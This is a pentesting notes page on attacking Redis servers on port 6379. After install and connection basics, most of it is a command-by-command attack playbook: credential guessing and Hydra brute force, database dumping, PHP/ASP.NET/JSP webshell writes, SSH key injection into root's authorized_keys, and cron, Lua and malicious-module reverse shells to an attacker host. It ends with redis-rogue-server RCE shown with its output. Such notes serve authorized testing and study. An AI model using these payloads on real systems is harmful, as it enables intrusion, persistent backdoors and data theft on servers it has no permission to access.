---
title: 6379 redis
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - redis
  - port 6379
---
# 6379 redis

- https://hackviser.com/tactics/pentesting/services/redis

## Description

Redis (REmote DIctionary Server) is an open-source advanced NoSQL key-value data store used as a database, cache, and message broker. The Redis command line interface (redis-cli) is a terminal program used to send commands to and read replies from the Redis server. Redis popularized the idea of a system that can be considered a store and a cache at the same time.Redis is an open-source, in-memory key-value data store. Whether you’ve installed Redis locally or you’re working with a remote instance, you need to connect to it in order to perform most operations.


### The server

Redis runs as server-side software so its core functionality is in its server component. The server listens for connections from clients, programmatically or through the command-line interface.


### The CLI

The command-line interface (CLI) is a powerful tool that gives you complete access to Redis’s data and its functionalities if you are developing a software or tool that needs to interact with it.


### Database

The database is stored in the server's RAM to enable fast data access. Redis also writes the contents of the database to disk at varying intervals to persist it as a backup, in case of failure.


## Install redis in your kali

### Prerequisites

If you're running a very minimal distribution (such as a Docker container) you may need to install lsb-release first:

```bash
sudo apt install lsb-release
```

Add the repository to the apt index, update it, and then install:

```bash
curl -fsSL https://packages.redis.io/gpg | sudo gpg --dearmor -o /usr/share/keyrings/redis-archive-keyring.gpg

echo "deb [signed-by=/usr/share/keyrings/redis-archive-keyring.gpg] https://packages.redis.io/deb $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/redis.list

sudo apt-get update

sudo apt-get install redis
```

## To connect to a terminal

First thing to know is that you can use “telnet” (usually on Redis default port 6379)

```bash
telnet localhost 6379
```

If you have redis-server installed locally, you can connect to the Redis instance with the redis-cli command.

If you want to connect to a remote Redis datastore, you can specify its host and port numbers with the -h and -p flags, respectively. Also, if you’ve configured your Redis database to require a password, you can include the -a flag followed by your password in order to authenticate:

```bash
redis-cli -h host -p port_number -a password
```

If you’ve set a Redis password, clients will be able to connect to Redis even if they don’t include the -a flag in their redis-cli command. However, they won’t be able to add, change, or query data until they authenticate. To authenticate after connecting, use the auth command followed by the password:

```bash
auth password
```

If the password passed to auth is valid, the command will return OK. Otherwise, it will return an error.


```bash
redis-cli -h 10.129.124.88
```

Connect via URL:

```bash
redis://:<password>@<hostname>:<port>
```


Upon a successful connection with the Redis server, we should be able to see a prompt in the terminal as:

```
IP:6379>
```

One of the basic Redis enumeration commands is info which returns information and statistics about the Redis server. 

## Enumeration

Use specialized tools for Redis server enumeration and vulnerability assessment.

```
use auxiliary/scanner/redis/redis_servermsf auxiliary(scanner/redis/redis_server) > set rhosts target.commsf auxiliary(scanner/redis/redis_server) > exploit
```


## Attack Vectors

### Passwordless Authentication

Redis allows users to connect to a server without needing a specific identity by utilizing a passwordless login feature. This method is commonly employed for accessing or downloading public files.

```
redis-cli -h target.com
```

### Default and Weak Credentials

Redis installations often retain default or weak credentials for system accounts.

```
redis-cli -h target.com --user <username> -a <password># Common credentials to try:# admin:admin# administrator:administrator# root:root# user:user# test:test# redis:redis
```

### Brute Force Attack

A brute-force attack involves trying many passwords or usernames to find the right one for accessing a system. Tools like Hydra are designed for cracking into networks and can be used on services like Redis.

#### Using Hydra

```
hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] redis://target.com
```

## Exploitation 
### Dumping Database

Inside Redis the databases are numbers starting from 0. You can find if anyone is used in the output of the command info inside the "Keyspace" chunk:

```
# Keyspace
db0:keys=4, expires=0, avg_ttl=0
db1:keys=2, expires=0, avg_ttl=0
```

Or you can just get all the keyspaces (databases) with:

```redis
INFO keyspace
```

Redis has a concept of separated namespaces called “databases”. You can select the database number you want to use with “SELECT”. By default the database with index 0 is used. 

```redis
# Select database
redis 127.0.0.1:6379> SELECT 1

# To see all keys in a given database. First, you enter in it with "SELECT <number>" and then
redis 127.0.0.1:6379> keys *

# To retrieve a specific key
redis 127.0.0.1:6379> get flag
```

### Webshell Upload via Redis

Upload webshells to web directories using Redis file write capabilities.

```bash
# Method 1: PHP webshell
redis-cli -h target.com
> flushall
> set shell '<?php system($_REQUEST["cmd"]); ?>'
> config set dbfilename shell.php
> config set dir /var/www/html
> save

# Access: http://target.com/shell.php?cmd=whoami

# Method 2: ASP.NET webshell
> set shell '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%Process.Start(Request["cmd"]);%>'
> config set dbfilename shell.aspx
> config set dir C:\\inetpub\\wwwroot
> save

# Method 3: JSP webshell
> set shell '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'
> config set dbfilename shell.jsp
> config set dir /var/www/html
> save
```

### SSH Key Injection

Inject SSH public keys into authorized_keys files for persistent access.

```bash
# Generate SSH key
ssh-keygen -t rsa -f redis_key

# Prepare key with newlines
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt

# Inject into authorized_keys
redis-cli -h target.com flushall
cat key.txt | redis-cli -h target.com -x set ssh_key
redis-cli -h target.com config set dbfilename authorized_keys
redis-cli -h target.com config set dir /root/.ssh
redis-cli -h target.com save

# Alternative paths
/home/redis/.ssh/authorized_keys
/home/ubuntu/.ssh/authorized_keys
/var/lib/redis/.ssh/authorized_keys

# Connect via SSH
ssh -i redis_key root@target.com
```

### Cron Job Persistence

Create persistent backdoor access using cron job injection.

```bash
# Create reverse shell cron job
redis-cli -h target.com
> flushall
> set cron "\n\n*/1 * * * * bash -i >& /dev/tcp/attacker-ip/4444 0>&1\n\n"
> config set dbfilename root
> config set dir /var/spool/cron/crontabs
> save

# Alternative cron paths
/var/spool/cron/root
/var/spool/cron/crontabs/root
/etc/cron.d/redis_backdoor
```

### Loading Malicious Module

Load malicious Redis modules for command execution capabilities.

```bash
# Redis modules allow custom commands  
# Compile malicious module with system() function  
  
# Load module  
redis-cli -h target.com  
> MODULE LOAD /path/to/evil.so  
  
# Execute custom command  
> evil.exec "whoami"  
> evil.exec "bash -i >& /dev/tcp/attacker-ip/4444 0>&1"
```

### Reverse Shell via Lua Scripting

Execute system commands using Redis Lua scripting capabilities.

```bash
# If Lua scripting is enabled
redis-cli -h target.com

# Execute Lua script
> EVAL "return os.execute('whoami')" 0

# Reverse shell
> EVAL "return os.execute('bash -i >& /dev/tcp/attacker-ip/4444 0>&1')" 0

# Alternative with redis.call
> EVAL "redis.call('SET','shell','test'); return os.execute('id')" 0

```


### Master-Slave Replication Abuse

Exploit Redis replication to load malicious modules on target systems.

```bash
# If you can configure replication
# Point target to attacker's rogue Redis master

# On attacker machine, run rogue Redis server
# Configure it to send malicious module

# On target
redis-cli -h target.com
> SLAVEOF attacker-ip 6379
> MODULE LOAD /path/to/evil.so

# Rogue master sends malicious module
# Target loads and executes it
```

## RCE in version < 5.o.5

(See the Offsec machine Blackgate).

Use redis-rogue-server. Repo at: 
https://github.com/n0b0dyCN/redis-rogue-server?source=post_page-----49920d4188de---------------------------------------


```bash
git clone https://github.com/n0b0dyCN/redis-rogue-server.git
cd redis-rogue-server
```

Interactive shell:

```
➜ ./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1
______         _ _      ______                         _____                          
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

[info] TARGET 127.0.0.1:6379
[info] SERVER 127.0.0.1:21000
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: i
[info] Interact mode start, enter "exit" to quit.
[<<] whoami
[>>] :n0b0dy
[<<] 
```


Reverse shell. Two things:
1. Make sure exp.so is in the same directory that the py file.
2. set a listener

```
➜ ./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1
______         _ _      ______                         _____
| ___ \       | (_)     | ___ \                       /  ___|
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|
                                     __/ |
                                    |___/
@copyright n0b0dy @ r3kapig

[info] TARGET 127.0.0.1:6379
[info] SERVER 127.0.0.1:21000
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: r
[info] Open reverse shell...
Reverse server address: 127.0.0.1
Reverse server port: 9999
[info] Reverse shell payload sent.
[info] Check at 127.0.0.1:9999
[info] Unload module...
```

Receive reverse shell:

```
➜ nc -lvvp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from localhost.localdomain 39312 received!
whoami
n0b0dy
```